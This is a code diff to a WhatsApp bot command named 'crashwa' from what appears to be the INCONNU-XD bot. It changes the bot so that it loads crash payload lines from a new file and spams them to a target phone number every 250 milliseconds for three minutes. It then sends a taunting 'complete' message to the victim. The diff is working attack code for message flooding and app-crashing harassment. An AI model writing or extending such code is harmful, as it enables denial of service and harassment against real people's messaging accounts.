@@ -1,6 +1,6 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../bug/izuka5.js'); // Bon chemen ak non
+const bugchat = require('../bug/izuka6.js'); // Bon chemen ak non
 
 cmd({
   pattern: 'crashwa',
@@ -46,21 +46,30 @@ cmd({
     }
 
     const targetJid = `${targetNumber}@s.whatsapp.net`;
-    const crashLines = bugchat.split('\n').filter(Boolean); // ⚠️ Te gen izuka5 la isit — korije li
+    const crashLines = bugchat.split('\n').filter(Boolean);
 
     await bot.sendMessage(from, {
-      text: `💣 *CRASHWA Attack Initiated*\n📱 Target: +${targetNumber}\n📦 Payload: ${crashLines.length} lines\n\n⚠️ Wait while the attack is sent...`
+      text: `💣 *CRASHWA Attack Initiated*\n📱 Target: +${targetNumber}\n📦 Payload: ${crashLines.length} lines\n🕒 Duration: 3 minutes\n\n⚠️ Attack is in progress...`
     }, { quoted: mek });
 
-    for (let i = 0; i < crashLines.length; i++) {
-      await bot.sendMessage(targetJid, {
-        text: `💥 *CRASHWA PACKET #${i + 1}*\n${crashLines[i]}\n\n💣 _INCONNU-XD CRASHWA ENGINE_`
-      });
-      await new Promise(r => setTimeout(r, 250));
+    const startTime = Date.now();
+    let totalSent = 0;
+
+    while (Date.now() - startTime < 3 * 60 * 1000) { // 3 minutes
+      for (let line of crashLines) {
+        await bot.sendMessage(targetJid, {
+          text: `💥 *CRASHWA PACKET #${++totalSent}*\n${line}\n\n💣 _INCONNU-XD CRASHWA ENGINE_`
+        }).catch(err => console.error(`❌ Send failed:`, err));
+        await new Promise(r => setTimeout(r, 250)); // 250ms delay
+      }
     }
 
+    await bot.sendMessage(targetJid, {
+      text: `💀 *INCONNU CRASHWA COMPLETE*\n🧨 Sent: ${totalSent} crash payloads\n🕒 Duration: 3 minutes\n~INCONNU-XD~`
+    });
+
     await bot.sendMessage(from, {
-      text: `✅ *CRASHWA attack completed successfully on* +${targetNumber}.`
+      text: `✅ *CRASHWA completed*\n📤 Sent: ${totalSent} messages\n🎯 Target: +${targetNumber}`
     }, { quoted: mek });
 
   } catch (error) {
